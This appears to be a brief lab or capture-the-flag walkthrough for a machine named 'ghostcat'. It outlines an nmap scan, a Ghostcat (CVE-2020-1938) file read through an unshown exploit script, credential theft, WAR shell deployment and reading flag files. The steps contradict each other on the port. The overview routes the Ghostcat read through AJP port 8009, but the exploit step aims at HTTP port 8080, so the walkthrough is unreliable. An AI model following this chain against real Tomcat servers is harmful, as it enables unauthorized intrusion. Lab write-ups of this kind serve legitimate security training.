# Machine 07: ghostcat -- CVE-2020-1938 Walkthrough

## Overview
- **CVE**: CVE-2020-1938 (CVSS 9.8)
- **Kill Chain**: nmap -> AJP 8009 + HTTP 8080 -> Ghostcat WEB-INF read -> admin creds -> WAR deploy -> root

## Step 1: Reconnaissance
```bash
nmap -sC -sV -p- 10.10.7.10
# Port 8080 open
```

## Step 2: Enumeration
Identify the vulnerable service on port 8080. Research CVE-2020-1938.

## Step 3: Exploitation
```bash
python3 exploit.py --target 10.10.7.10 --port 8080
cat /home/user/user.txt  # User flag
```

## Step 4: Privilege Escalation
Method: WAR shell deployment
```bash
# After escalation:
cat /root/root.txt  # Root flag
```
